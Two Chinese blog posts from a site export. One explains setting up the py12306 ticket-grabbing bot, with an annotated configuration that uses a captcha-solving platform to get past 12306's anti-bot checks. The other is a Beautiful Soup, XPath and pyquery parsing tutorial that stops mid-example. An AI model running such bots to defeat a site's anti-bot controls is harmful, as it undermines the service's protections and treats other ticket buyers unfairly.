于我而言，现在的春节似乎已经没有了幼时所应该感受到的乐趣。蓦然回首，往事历历在目，仍记得幼时的伙伴常常聚在一起玩卡牌、捡鞭炮、拜年….如今，这一切的一切都已成浮云，或许是因为我们感受到了生活、学习等带来的压力，在压力袭来的同时我们一步步的成长着，现在的我们必须学会某些事、承担某些事，所以幼时的无忧无虑现在是那么的奢侈。 前言春节之后，大多数亲戚朋友都需要为了生活而奔波而远离家乡，前段时间有亲戚因购买不到南昌-深圳的车票而焦灼着。众所周知，12306的防爬措施是做的很极致的，曾经自己也尝试着使用python来写一个12306的抢票程序，耐于目前自己的能力以及时间受限，在验证过程中始终通过不了，而自己又没有足够的经济条件来使用打码平台，所以就尝试去github上搜索下相关12306抢票项目。果不其然，在github上就有这么一款12306抢票神器，使用之后然我欲罢不能，经过四天的努力终于帮亲戚抢到了3张南昌-深圳的车票。 前人栽树，后人乘凉。基于该神器的强大，所以想通过该文章记录一下使用方式，也方便后来者的较快的了解该项目，项目github仓库：https://github.com/pjialin/py12306，在此，也感谢作者的用心良苦，希望这个工具能够帮助到大家。 正文该项目需要在python3.6以上版本才能使用，操作系统windowns、linux、mac（亲测有效）都可以，这里我们使用windows为例。 首先，我们需要前往github仓库下载下载该12306抢票项目（py12306），git的下载在这里就不再说明了，不清楚的可以跳至：Git安装，安装好后我们通过如下命令来进行下载： 1git clone https://github.com/pjialin/py12306 在安装好python3.6以上版本之后，我们还需要安装其他支持工具，这里python建议下载Anaconda，下载及安装操作见：Anaconda下载及安装，python安装好后，我们在终端执行如下命令来下载支持工具： 123pip install redis==3.0.1pip install Flask-JWT-Extended==3.15.0pip install requests-html==0.9.0 随后，我们复制/py12306/env.py.example文件并将复制后的文件命名为env.py。 打开浏览器使用目标12306账号登录12306官网并添加抢票乘客（可多个，注意将身份证等信息填写正确，学生需要额外填写相关信息）。 使用sublime编辑器（亦或其他）打开上述复制的env.py文件，并将12306账号、车次、时间等信息配置完成，主要配置说明如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485# 设置一：12306抢票账号USER_ACCOUNTS = [ &#123; 'key': 0, # 12306账号id1，用于区分不同抢票账号 'user_name': [username1], # 12306账号用户名1 'password': [password1], # 12306账号用户密码1 &#125;, # &#123; # 'key': 2, # 12306账号id2 # 'user_name': [username2], # 用户2 # 'password': [password2], # 密码2 # &#125;,]# 设置二： 打码平台，用于验证码识别# 打码平台账号# 目前只支持免费打码接口 和 若快打码，注册地址：http://www.ruokuai.com/loginAUTO_CODE_PLATFORM = 'free' # 免费填写 free 若快 ruokuai # 免费打码无法保证持续可用，如失效请手动切换AUTO_CODE_ACCOUNT = &#123; # 使用 free 可用省略 'user': 'your user name', 'pwd': 'your password'&#125;# 设置三：邮箱配置，用于抢票成功通知EMAIL_ENABLED = 1 # 是否开启邮件通知EMAIL_SENDER = 'XXX@qq.com' # 邮件发送者EMAIL_RECEIVER = ['XXX1@qq.com', 'XXX2@qq.com'] # 邮件接受者，可以多个 EMAIL_SERVER_HOST = 'smtp.qq.com' # 邮件服务 hostEMAIL_SERVER_USER = 'XXX@qq.com' # 邮件服务登录用户名，我在抢票的时候使用的是qq邮件服务，自行前往qq邮箱进行设置EMAIL_SERVER_PASSWORD = 'password' # 邮件服务登录密码，qq邮箱设置完成之后会有一个密码，于此处填写即可# 设置四： web管理（flask）WEB_ENABLE = 1 # 是否打开 Web 管理WEB_USER = &#123; # 登录信息 'username': 'admin', 'password': 'password'&#125;WEB_PORT = 8008 # 监听端口# 设置完成并程序运行之后，请求http://localhost:8008登录进行管理# 设置五：乘客信息设置QUERY_JOBS = [ &#123; # 'job_name': 'bj -&gt; sz', # 任务名称，不填默认会以车站名命名，不可重复 'account_key': 0, # 将会使用指定账号下单，于之前的12306账号id对应 'left_dates': [ # 出发日期 :Array，可多选，按照自己的行程排序 \"2019-02-16\", \"2019-02-17\", ], 'stations': &#123; # 车站 支持多个车站同时查询 :Dict or :List 'left': '亳州', # 始发地 'arrive': '北京西', # 目的地 &#125;, # # 多个车站示例 (建议添加多个，有时多买几站成功率会高一点) # 'stations': [&#123; # 'left': '北京', # 'arrive': '深圳', # &#125;,&#123; # 多个车站示例 # 'left': '北京', # 'arrive': '广州', # &#125;], 'members': [ \"张三\", # 乘客姓名，于之前12306账号添加的乘客一致，可自动识别乘客类别 ], 'allow_less_member': 0, # 是否允许余票不足时提交部分乘客 'seats': [ # 筛选座位，可多选，根据自己的倾向进行排序 # 可用值: 特等座, 商务座, 一等座, 二等座, 软卧, 硬卧, 动卧, 软座, 硬座, 无座 '硬卧', # '软卧', ], 'train_numbers': [ # 筛选车次 可以为空，为空则所有车次都可以提交 如 [] 注意大小写需要保持一致 \"K148\", # \"K1172\", ], 'except_train_numbers': [ # 筛选车次，排除车次 train_numbers 和 except_train_numbers 不可同时存在 ], 'period': &#123; # 筛选时间 'from': '00:00', 'to': '24:00' &#125; &#125;, # 如若有其他12306账号进行抢票，可在此列表中进行添加，添加内容同上] 于此，该项目的设置基本完成，之后我们运行main.py主程序即可，命令如下： 1cd ./py12306 $$ python main.py 运行结果示例如下： 结语以上内容仅为该项目的部分功能，如若像了解该项目更多信息，可前往项目地址:py12306 py12306交流群：274781597 最后，感谢作者的用心良苦，希望这个工具能够帮助到大家。","path":"2019/02/13/12306自动化抢票/"},{"title":"网页爬虫之页面解析","text":"前言With the rapid development of the Internet，越来越多的信息充斥着各大网络平台。正如《死亡笔记》中L·Lawliet这一角色所提到的大数定律，在众多繁杂的数据中必然存在着某种规律，偶然中必然包含着某种必然的发生。不管是我们提到的大数定律，还是最近火热的大数据亦或其他领域都离不开大量而又干净数据的支持，为此，网络爬虫能够满足我们的需求，即在互联网上按照我们的意愿来爬取我们任何想要得到的信息，以便我们分析出其中的必然规律，进而做出正确的决策。同样，在我们平时上网的过程中，无时无刻可见爬虫的影子，比如我们广为熟知的“度娘”就是其中一个大型而又名副其实的“蜘蛛王”（SPIDER KING）。而要想写出一个强大的爬虫程序，则离不开熟练的对各种网络页面的解析，这篇文章将给读者介绍如何在Python中使用各大解析工具。 内容扼要常用的解析方式主要有正则、Beautiful Soup、XPath、pyquery，本文主要是讲解后三种工具的使用，而对正则表达式的使用不做讲解，对正则有兴趣了解的读者可以跳转：正则表达式 Beautiful Soup的使用 XPath的使用 pyquery的使用 Beautiful Soup、XPath、pyquery解析腾讯招聘网案例 Beautiful SoupBeautiful Soup是Python爬虫中针对HTML、XML的其中一个解析工具，熟练的使用之可以很方便的提取页面中我们想要的数据。此外，在Beautiful Soup中，为我们提供了以下四种解析器： 标准库，soup = BeautifulSoup(content, &quot;html.parser&quot;) lxml解析器，soup = BeautifulSoup(content, &quot;lxml&quot;) xml解析器，soup = BeautifulSoup(content, &quot;xml&quot;) html5lib解析器，soup = BeautifulSoup(content, &quot;html5lib&quot;) 在以上四种解析库中，lxml解析具有解析速度快兼容错能力强的merits，所以本文主要使用的是lxml解析器，下面我们主要拿百度首页的html来具体讲解下Beautiful Soup的使用： 12345678from bs4 import BeautifulSoupimport requestsif __name__ == \"__main__\": response = requests.get(\"https://www.baidu.com\") encoding = response.apparent_encoding response.encoding = encoding print(BeautifulSoup(response.text, \"lxml\")) 代码解读： response = requests.get(&quot;https://www.baidu.com&quot;)，requests请求百度链接 encoding = response.apparent_encoding，获取页面编码格式 response.encoding = encoding，修改请求编码为页面对应的编码格式，以避免乱码 print(BeautifulSoup(response.text, &quot;lxml&quot;))，使用lxml解析器来对百度首页html进行解析并打印结果 打印后的结果如下所示： 1234&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt; &lt;head&gt;&lt;meta content=\"text/html;charset=utf-8\" http-equiv=\"content-type\"/&gt;&lt;meta content=\"IE=Edge\" http-equiv=\"X-UA-Compatible\"/&gt;&lt;meta content=\"always\" name=\"referrer\"/&gt;&lt;link href=\"https://ss1.bdstatic.com/5eN1bjq8AAUYm2zgoY3K/r/www/cache/bdorz/baidu.min.css\" rel=\"stylesheet\" type=\"text/css\"/&gt;&lt;title&gt;百度一下，你就知道&lt;/title&gt;&lt;/head&gt; &lt;body link=\"#0000cc\"&gt; &lt;div id=\"wrapper\"&gt; &lt;div id=\"head\"&gt; &lt;div class=\"head_wrapper\"&gt; &lt;div class=\"s_form\"&gt; &lt;div class=\"s_form_wrapper\"&gt; &lt;div id=\"lg\"&gt; &lt;img height=\"129\" hidefocus=\"true\" src=\"//www.baidu.com/img/bd_logo1.png\" width=\"270\"/&gt; &lt;/div&gt; &lt;form action=\"//www.baidu.com/s\" class=\"fm\" id=\"form\" name=\"f\"&gt; &lt;input name=\"bdorz_come\" type=\"hidden\" value=\"1\"/&gt; &lt;input name=\"ie\" type=\"hidden\" value=\"utf-8\"/&gt; &lt;input name=\"f\" type=\"hidden\" value=\"8\"/&gt; &lt;input name=\"rsv_bp\" type=\"hidden\" value=\"1\"/&gt; &lt;input name=\"rsv_idx\" type=\"hidden\" value=\"1\"/&gt; &lt;input name=\"tn\" type=\"hidden\" value=\"baidu\"/&gt;&lt;span class=\"bg s_ipt_wr\"&gt;&lt;input autocomplete=\"off\" autofocus=\"autofocus\" class=\"s_ipt\" id=\"kw\" maxlength=\"255\" name=\"wd\" value=\"\"/&gt;&lt;/span&gt;&lt;span class=\"bg s_btn_wr\"&gt;&lt;input autofocus=\"\" class=\"bg s_btn\" id=\"su\" type=\"submit\" value=\"百度一下\"/&gt;&lt;/span&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=\"u1\"&gt; &lt;a class=\"mnav\" href=\"http://news.baidu.com\" name=\"tj_trnews\"&gt;新闻&lt;/a&gt; &lt;a class=\"mnav\" href=\"https://www.hao123.com\" name=\"tj_trhao123\"&gt;hao123&lt;/a&gt; &lt;a class=\"mnav\" href=\"http://map.baidu.com\" name=\"tj_trmap\"&gt;地图&lt;/a&gt; &lt;a class=\"mnav\" href=\"http://v.baidu.com\" name=\"tj_trvideo\"&gt;视频&lt;/a&gt; &lt;a class=\"mnav\" href=\"http://tieba.baidu.com\" name=\"tj_trtieba\"&gt;贴吧&lt;/a&gt; &lt;noscript&gt; &lt;a class=\"lb\" href=\"http://www.baidu.com/bdorz/login.gif?login&amp;amp;tpl=mn&amp;amp;u=http%3A%2F%2Fwww.baidu.com%2f%3fbdorz_come%3d1\" name=\"tj_login\"&gt;登录&lt;/a&gt; &lt;/noscript&gt; &lt;script&gt;document.write('&lt;a href=\"http://www.baidu.com/bdorz/login.gif?login&amp;tpl=mn&amp;u='+ encodeURIComponent(window.location.href+ (window.location.search === \"\" ? \"?\" : \"&amp;\")+ \"bdorz_come=1\")+ '\" name=\"tj_login\" class=\"lb\"&gt;登录&lt;/a&gt;'); &lt;/script&gt; &lt;a class=\"bri\" href=\"//www.baidu.com/more/\" name=\"tj_briicon\" style=\"display: block;\"&gt;更多产品&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=\"ftCon\"&gt; &lt;div id=\"ftConw\"&gt; &lt;p id=\"lh\"&gt; &lt;a href=\"http://home.baidu.com\"&gt;关于百度&lt;/a&gt; &lt;a href=\"http://ir.baidu.com\"&gt;About Baidu&lt;/a&gt; &lt;/p&gt; &lt;p id=\"cp\"&gt;©2017 Baidu &lt;a href=\"http://www.baidu.com/duty/\"&gt;使用百度前必读&lt;/a&gt; &lt;a class=\"cp-feedback\" href=\"http://jianyi.baidu.com/\"&gt;意见反馈&lt;/a&gt; 京ICP证030173号 &lt;img src=\"//www.baidu.com/img/gs.gif\"/&gt; &lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 从上述代码中，我们可以看见打印出的内容有点过于杂乱无章，为了使得解析后的页面清洗直观，我们可以使用prettify()方法来对其进行标准的缩进操作，为了方便讲解，博主对结果进行适当的删除，只留下有价值的内容，源码及输出如下： 12bd_soup = BeautifulSoup(response.text, \"lxml\")print(bd_soup.prettify()) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;html&gt; &lt;head&gt; &lt;title&gt; 百度一下，你就知道 &lt;/title&gt; &lt;/head&gt; &lt;body link=\"#0000cc\"&gt; &lt;div id=\"wrapper\"&gt; &lt;div id=\"head\"&gt; &lt;div class=\"head_wrapper\"&gt; &lt;div class=\"s_form\"&gt; &lt;div class=\"s_form_wrapper\"&gt; &lt;div id=\"lg\"&gt; &lt;img height=\"129\" hidefocus=\"true\" src=\"//www.baidu.com/img/bd_logo1.png\" width=\"270\"/&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=\"u1\"&gt; &lt;a class=\"mnav\" href=\"http://news.baidu.com\" name=\"tj_trnews\"&gt; 新闻 &lt;/a&gt; &lt;a class=\"mnav\" href=\"https://www.hao123.com\" name=\"tj_trhao123\"&gt; hao123 &lt;/a&gt; &lt;a class=\"mnav\" href=\"http://map.baidu.com\" name=\"tj_trmap\"&gt; 地图 &lt;/a&gt; &lt;a class=\"mnav\" href=\"http://v.baidu.com\" name=\"tj_trvideo\"&gt; 视频 &lt;/a&gt; &lt;a class=\"mnav\" href=\"http://tieba.baidu.com\" name=\"tj_trtieba\"&gt; 贴吧 &lt;/a&gt; &lt;a class=\"bri\" href=\"//www.baidu.com/more/\" name=\"tj_briicon\" style=\"display: block;\"&gt; 更多产品 &lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=\"ftCon\"&gt; &lt;div id=\"ftConw\"&gt; &lt;p id=\"lh\"&gt; &lt;a href=\"http://home.baidu.com\"&gt; 关于百度 &lt;/a&gt; &lt;a href=\"http://ir.baidu.com\"&gt; About Baidu &lt;/a&gt; &lt;/p&gt; &lt;p id=\"cp\"&gt; ©2017 Baidu &lt;a href=\"http://www.baidu.com/duty/\"&gt; 使用百度前必读 &lt;/a&gt; &lt;a class=\"cp-feedback\" href=\"http://jianyi.baidu.com/\"&gt; 意见反馈 &lt;/a&gt; 京ICP证030173号 &lt;img src=\"//www.baidu.com/img/gs.gif\"/&gt; &lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 节点选择在Beautiful Soup中，我们可以很方便的选择想要得到的节点，只需要在bd_soup对象中使用.的方式即可，使用如下： 12345678bd_title_bj = bd_soup.titlebd_title_bj_name = bd_soup.title.namebd_title_name = bd_soup.title.stringbd_title_parent_bj_name = bd_soup.title.parent.namebd_image_bj = bd_soup.imgbd_image_bj_dic = bd_soup.img.attrsbd_image_all = bd_soup.find_all(\"img\")bd_image_idlg = bd_soup.find(\"div\", id=\"lg\") 代码解读： bd_soup.title，正如前面所说，Beautiful Soup可以很简单的解析对应的页面，只需要使用bd_soup.的方式进行选择节点即可，该行代码正是获得百度首页html的title节点内容 bd_soup.title.name，使用.name的形式即可获取节点的名称 bd_soup.title.string，使用.string的形式即可获得节点当中的内容，这句代码就是获取百度首页的title节点的内容，即浏览器导航条中所显示的百度一下，你就知道 bd_soup.title.parent.name，使用.parent可以该节点的父节点，通俗地讲就是该节点所对应的上一层节点，然后使用.name获取父节点名称 bd_soup.img，如bd_soup.title一样，该代码获取的是img节点，只不过需要注意的是：在上面html中我们可以看见总共有两个img节点，而如果使用.img的话默认是获取html中的第一个img节点，而不是所有 bd_soup.img.attrs，获取img节点中所有的属性及属性内容，该代码输出的结果是一个键值对的字典格式，所以之后我们只需要通过字典的操作来获取属性所对应的内容即可。比如bd_soup.img.attrs.get(&quot;src&quot;)和bd_soup.img.attrs[&quot;src&quot;]的方式来获取img节点所对应的src属性的内容，即图片链接 bd_soup.find_all(&quot;img&quot;)，在上述中的.img操作默认只能获取第一个img节点，而要想获取html中所有的img节点，我们需要使用.find_all(&quot;img&quot;)方法，所返回的是一个列表格式，列表内容为所有的选择的节点 bd_soup.find(&quot;div&quot;, id=&quot;lg&quot;)，在实际运用中，我们往往会选择指定的节点，这个时候我们可以使用.find()方法，里面可传入所需查找节点的属性，这里需要注意的是：在传入class属性的时候其中的写法是.find(&quot;div&quot;, class_=&quot;XXX&quot;)的方式。所以该行代码表示的是获取id属性为lg的div节点，此外，在上面的.find_all()同样可以使用该方法来获取指定属性所对应的所有节点 上述代码中解析的结果对应打印如下： 12345678&lt;title&gt;百度一下，你就知道&lt;/title&gt;title百度一下，你就知道head&lt;img height=\"129\" hidefocus=\"true\" src=\"//www.baidu.com/img/bd_logo1.png\" width=\"270\"/&gt;&#123;'hidefocus': 'true', 'src': '//www.baidu.com/img/bd_logo1.png', 'width': '270', 'height': '129'&#125;[&lt;img height=\"129\" hidefocus=\"true\" src=\"//www.baidu.com/img/bd_logo1.png\" width=\"270\"/&gt;, &lt;img src=\"//www.baidu.com/img/gs.gif\"/&gt;]&lt;div id=\"lg\"&gt; &lt;img height=\"129\" hidefocus=\"true\" src=\"//www.baidu.com/img/bd_logo1.png\" width=\"270\"/&gt; &lt;/div&gt; 数据提取在上一小节节点选择我们讲到了部分数据提取的方法，然而，Beautiful Soup的强大之处还不止步于此。接下来我们继续揭开其神秘的面纱。 .get_text()获取对象中所有的内容： 1all_content = bd_soup.get_text() 123百度一下，你就知道 新闻 hao123 地图 视频 贴吧 登录 document.write('&lt;a href=\"http://www.baidu.com/bdorz/login.gif?login&amp;tpl=mn&amp;u='+ encodeURIComponent(window.location.href+ (window.location.search === \"\" ? \"?\" : \"&amp;\")+ \"bdorz_come=1\")+ '\" name=\"tj_login\" class=\"lb\"&gt;登录&lt;/a&gt;'); 更多产品 关于百度 About Baidu ©2017 Baidu 使用百度前必读 意见反馈 京ICP证030173号 .strings，.stripped_strings12print(type(bd_soup.strings))# &lt;class 'generator'&gt; .strings用于提取bd_soup对象中所有的内容，而从上面的输出结果我们可以看出.strings的类型是一个生成器，对此可以使用循环来提取出其中的内容。但是我们在使用.strings的过程中会发现提取出来的内容有很多的空格以及换行，对此我们可以使用.stripped_strings方法来解决该问题，用法如下： 12for each in bd_soup.stripped_strings: print(each) 输出结果： 1234567891011121314百度一下，你就知道新闻hao123地图视频贴吧登录更多产品关于百度About Baidu©2017 Baidu使用百度前必读意见反馈京ICP证030173号 .parent，.children，.parents.parent可以选择该节点的父节点，.children可以选择该节点的孩子节点，.parents选择该节点所有的上层节店，返回的是生成器，各用法如下： 12345678bd_div_bj = bd_soup.find(\"div\", id=\"u1\")print(type(bd_div_bj.parent))print(\"*\" * 50)for child in bd_div_bj.children: print(child)print(\"*\" * 50)for parent in bd_div_bj.parents: print(parent.name) 结果输出： 12345678910111213141516171819&lt;class 'bs4.element.Tag'&gt;************************************************** &lt;a class=\"mnav\" href=\"http://news.baidu.com\" name=\"tj_trnews\"&gt;新闻&lt;/a&gt; &lt;a class=\"mnav\" href=\"https://www.hao123.com\" name=\"tj_trhao123\"&gt;hao123&lt;/a&gt; &lt;a class=\"mnav\" href=\"http://map.baidu.com\" name=\"tj_trmap\"&gt;地图&lt;/a&gt; &lt;a class=\"mnav\" href=\"http://v.baidu.com\" name=\"tj_trvideo\"&gt;视频&lt;/a&gt; &lt;a class=\"mnav\" href=\"http://tieba.baidu.com\" name=\"tj_trtieba\"&gt;贴吧&lt;/a&gt;**************************************************divdivdivbodyhtml Beautiful Soup小结Beautiful Soup主要的用法就是以上一些，还有其他一些操作在实际开发过程中使用的不多，这里不做过多的讲解了，所以整体来讲Beautiful Soup的使用还是比较简单的，其他一些操作可见官方文档：https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html#contents-children XPathXPath全称是XML Path Language，它既可以用来解析XML，也可以用来解析HTML。在上一部分已经讲解了Beautiful Soup的一些常见的骚操作，在这里，我们继续来看看XPath的使用，瞧一瞧XPath的功能到底有多么的强大以致于受到了不少开发者的青睐。同Beautiful Soup一样，在XPath中提供了非常简洁的节点选择的方法，Beautiful Soup主要是通过.的方式来进行子节点或者子孙节点的选择，而在XPath中则主要通过/的方式来选择节点。除此之外，在XPath中还提供了大量的内置函数来处理各个数据之间的匹配关系。 首先，我们先来看看XPath常见的节点匹配规则： 表达式 解释说明 / 在当前节点中选取直接子节点 // 在当前节点中选取子孙节点 . 选取当前节点 .. 选取当前节点的父节点 @ 指定属性（id、class……） 下面我们继续拿上面的百度首页的HTML来讲解下XPath的使用。 节点选择要想正常使用Xpath，我们首先需要正确导入对应的模块，在此我们一般使用的是lxml，操作示例如下： 123456789101112from lxml import etreeimport requestsimport htmlif __name__ == \"__main__\": response = requests.get(\"https://www.baidu.com\") encoding = response.apparent_encoding response.encoding = encoding print(response.text) bd_bj = etree.HTML(response.text) bd_html = etree.tostring(bd_bj).decode(\"utf-8\") print(html.unescape(bd_html)) 1~9行代码如Beautiful Soup一致，下面对之后的代码进行解释： etree.HTML(response.text)，使用etree模块中的HTML类来对百度html(response.text)进行初始化以构造XPath解析对象，返回的类型为&lt;Element html at 0x1aba86b1c08&gt; etree.tostring(bd_html_elem).decode(&quot;utf-8&quot;)，将上述的对象转化为字符串类型且编码为utf-8 html.unescape(bd_html)，使用HTML5标准定义的规则将bd_html转换成对应的unicode字符。 打印出的结果如Beautiful Soup使用时一致，这里就不再显示了，不知道的读者可回翻。既然我们已经得到了Xpath可解析的对象(bd_bj)，下面我们就需要针对这个对象来选择节点了，在上面我们也已经提到了，XPath主要是通过/的方式来提取节点，请看下面Xpath中节点选择的一些常见操作： 12345all_bj = bd_bj.xpath(\"//*\") # 选取所有节点img_bj = bd_bj.xpath(\"//img\") # 选取指定名称的节点p_a_zj_bj = bd_bj.xpath(\"//p/a\") # 选取直接节点p_a_all_bj = bd_bj.xpath(\"//p//a\") # 选取所有节点head_bj = bd_bj.xpath(\"//title/..\") # 选取父节点 结果如下：123456789[&lt;Element html at 0x14d6a6d1c88&gt;, &lt;Element head at 0x14d6a6e4408&gt;, &lt;Element meta at 0x14d6a6e4448&gt;, &lt;Element meta at 0x14d6a6e4488&gt;, &lt;Element meta at 0x14d6a6e44c8&gt;, &lt;Element link at 0x14d6a6e4548&gt;, &lt;Element title at 0x14d6a6e4588&gt;, &lt;Element body at 0x14d6a6e45c8&gt;, &lt;Element div at 0x14d6a6e4608&gt;, &lt;Element div at 0x14d6a6e4508&gt;, &lt;Element div at 0x14d6a6e4648&gt;, &lt;Element div at 0x14d6a6e4688&gt;, ......][&lt;Element img at 0x14d6a6e4748&gt;, &lt;Element img at 0x14d6a6e4ec8&gt;][&lt;Element a at 0x14d6a6e4d88&gt;, &lt;Element a at 0x14d6a6e4dc8&gt;, &lt;Element a at 0x14d6a6e4e48&gt;, &lt;Element a at 0x14d6a6e4e88&gt;][&lt;Element a at 0x14d6a6e4d88&gt;, &lt;Element a at 0x14d6a6e4dc8&gt;, &lt;Element a at 0x14d6a6e4e48&gt;, &lt;Element a at 0x14d6a6e4e88&gt;][&lt;Element head at 0x14d6a6e4408&gt;] all_bj = bd_bj.xpath(&quot;//*&quot;)，使用//可以选择当前节点(html)下的所有子孙节点，且以一个列表的形式来返回，列表元素通过bd_bj一样是element对象，下面的返回类型一致 img_bj = bd_bj.xpath(&quot;//img&quot;)，选取当前节点下指定名称的节点，这里建议与Beautiful Soup的使用相比较可增强记忆，Beautiful Soup是通过.find_all(&quot;img&quot;)的形式 p_a_zj_bj = bd_bj.xpath(&quot;//p/a&quot;)，选取当前节点下的所有p节点下的直接子a节点，这里需要注意的是”直接“，如果a不是p节点的直接子节点则选取失败 p_a_all_bj = bd_bj.xpath(&quot;//p//a&quot;) ，选取当前节点下的所有p节点下的所有子孙a节点，这里需要注意的是”所有“，注意与上一个操作进行区分 head_bj = bd_bj.xpath(&quot;//title/..&quot;)，选取当前节点下的title节点的父节点，即head节点 数据提取在了解如何选择指定的节点之后，我们就需要提取节点中所包含的数据了，具体提取请看下面的示例： 1234img_href_ls = bd_bj.xpath(\"//img/@src\")img_href = bd_bj.xpath(\"//div[@id='lg']/img[@hidefocus='true']/@src\")a_content_ls = bd_bj.xpath(\"//a//text()\")a_news_content = bd_bj.xpath(\"//a[@class='mnav' and @name='tj_trnews']/text()\") 输出结果： 1234567['//www.baidu.com/img/bd_logo1.png', '//www.baidu.com/img/gs.gif']['//www.baidu.com/img/bd_logo1.png']['新闻', 'hao123', '地图', '视频', '贴吧', '登录', '更多产品', '关于百度', 'About Baidu', '使用百度前必读', '意见反馈']['新闻'] img_href_ls = bd_bj.xpath(&quot;//img/@src&quot;)，该代码先选取了当前节点下的所有img节点，然后将所有img节点的src属性值选取出来，返回的是一个列表形式 img_href = bd_bj.xpath(&quot;//div[@id=&#39;lg&#39;]/img[@hidefocus=&#39;true&#39;]/@src&quot;)，该代码首先选取了当前节点下所有id属性值为lg的div，然后继续选取div节点下的直接子img节点（hidefoucus=true），最后选取其中的src属性值 a_content_ls = bd_bj.xpath(&quot;//a//text()&quot;)，选取当前节点所有的a节点的所遇文本内容 a_news_content = bd_bj.xpath(&quot;//a[@class=&#39;mnav&#39; and @name=&#39;tj_trnews&#39;]/text()&quot;)，多属性选择，在xpath中可以指定满足多个属性的节点，只需要and即可 提醒：读者在阅读的过程中注意将代码和输出的结果仔细对应起来，只要理解其中的意思也就不难记忆了。 XPath小结耐心看完了XPath的使用方法之后，聪明的读者应该不难发现，其实Beautiful Soup和XPath的本质和思路上基本相同，只要我们在阅读XPath用法的同时在脑袋中不断的思考，相信聪明的你阅读至此已经能够基本掌握了XPath用法。 pyquery对于pyquery，官方的解释如下： pyquery allows you to make jquery queries on xml documents. The API is as much as possible the similar to jquery. pyquery uses lxml for fast xml and html manipulation.This is not (or at least not yet) a library to produce or interact with javascript code. I just liked the jquery API and I missed it in python so I told myself “Hey let’s make jquery in python”. This is the result.It can be used for many purposes, one idea that I might try in the future is to use it for templating with pure http templates that you modify using pyquery. I can also be used for web scrapping or for theming applications with Deliverance.The project is being actively developped on a git repository on Github. I have the policy of giving push access to anyone who wants it and then to review what he does. So if you want to contribute just email me.Please report bugs on the github issue tracker. 在网页解析过程中，除了强大的Beautiful Soup和XPath之外，还有qyquery的存在，qyquery同样受到了不少“蜘蛛”的欢迎，下面我们来介绍下qyquery的使用。 节点选择与Beautiful Soup和XPath明显不同的是，在qyquery中，一般存在着三种解析方式，一种是requests请求链接之后把html进行传递，一种是将url直接进行传递，还有一种是直接传递本地html文件路径即可，读者在实际使用的过程中根据自己的习惯来编码即可，下面我们来看下这三种方式的表达： 12345678910111213141516171819202122232425import requestsfrom pyquery import PyQuery as pqbd_html = requests.get(\"https://www.baidu.com\").textbd_url = \"https://www.baidu.com\"bd_path = \"./bd.html\"# 使用html参数进行传递def way1(html): return pq(html) # 使用url参数进行传递def way2(url): return pq(url=url)def way3(path): return pq(filename=path)print(type(way1(html=bd_html)))print(type(way2(url=bd_url)))print(type(way3(path=bd_path)))# &lt;class 'pyquery.pyquery.PyQuery'&gt;# &lt;class 'pyquery.pyquery.PyQuery'&gt;# &lt;class 'pyquery.pyquery.PyQuery'&gt; 从上面三种获得解析对象方法的代码中我们可以明显看见都可以得到一样的解析对象，接下来我们只要利用这个对象来对页面进行解析从而提取出我们想要得到的有效信息即可，在qyquery中一般使用的是CSS选择器来选取。下面我们仍然使用百度首页来讲解pyquery的使用，在这里我们假设解析对象为bd_bj。 12345678910111213141516response = requests.get(\"https://www.baidu.com\")response.encoding = \"utf-8\"bd_bj = pq(response.text)bd_title = bd_bj(\"title\")bd_img_ls = bd_bj(\"img\")bd_img_ls2 = bd_bj.find(\"img\")bd_mnav = bd_bj(\".mnav\")bd_img = bd_bj(\"#u1 a\")bd_a_video = bd_bj(\"#u1 .mnav\")# &lt;title&gt;百度一下，你就知道&lt;/title&gt;# &lt;img hidefocus=\"true\" src=\"//www.baidu.com/img/bd_logo1.png\" width=\"270\" height=\"129\"/&gt; &lt;img src=\"//www.baidu.com/img/gs.gif\"/&gt; # ......# 输出结果较长，读者可自行运行 正如上面代码所示，pyquery在进行节点提取的时候通常有三种方式，一种是直接提取出节点名即可提取出整个节点，当然这种方式你也可以使用find方法，这种提取节点的方式是不加任何属性限定的，所以提取出的节点往往会含有多个，所以我们可以使用循环.items()来进行操作；一种是提取出含有特定class属性的节点，这种形式采用的是.+class属性值；还有一种是提取含有特定id属性的节点，这种形式采用的是#+id属性值。熟悉CSS的读者应该不难理解以上提取节点的方法，正是在CSS中提取节点然后对其进行样式操作的方法。上述三种方式您也可以像提取bd_a_video一样混合使用 数据提取在实际解析网页的过程中，三种解析方式基本上大同小异，为了读者认识pyquery的数据提取的操作以及博主日后的查阅，在这里简单的介绍下 1234567img_src1 = bd_bj(\"img\").attr(\"src\") # //www.baidu.com/img/bd_logo1.pngimg_src2 = bd_bj(\"img\").attr.src # //www.baidu.com/img/bd_logo1.pngfor each in bd_bj.find(\"img\").items(): print(each.attr(\"src\")) print(bd_bj(\"title\").text()) # 百度一下，你就知道 如上一二行代码所示，提取节点属性我们可以有两种方式，这里拿src属性来进行说明，一种是.attr(&quot;src&quot;)，另外一种是.attr.src，读者根据自己的习惯来操作即可，这里需要注意的是：在节点提取小结中我们说了在不限制属性的情况下是提取出所有满足条件的节点，所以在这种情况下提取出的属性是第一个节点属性。要想提取所有的节点的属性，我们可以如四五行代码那样使用.items()然后进行遍历，最后和之前一样提取各个节点属性即可。qyquery提取节点中文本内容如第七行代码那样直接使用.text()即可。 pyquery小结pyquery解析如Beautiful Soup和XPath思想一致，所以这了只是简单的介绍了下，想要进一步了解的读者可查阅官方文档在加之熟练操作即可。 腾讯招聘网解析实战通过上述对Beautiful Soup、XPath以及pyquery的介绍，认真阅读过的读者想必已经有了一定的基础，下面我们通过一个简单的实战案例来强化一下三种解析方式的操作。此次解析的网站为腾讯招聘网，网址url：https://hr.tencent.com/，其社会招聘网首页如下所示： 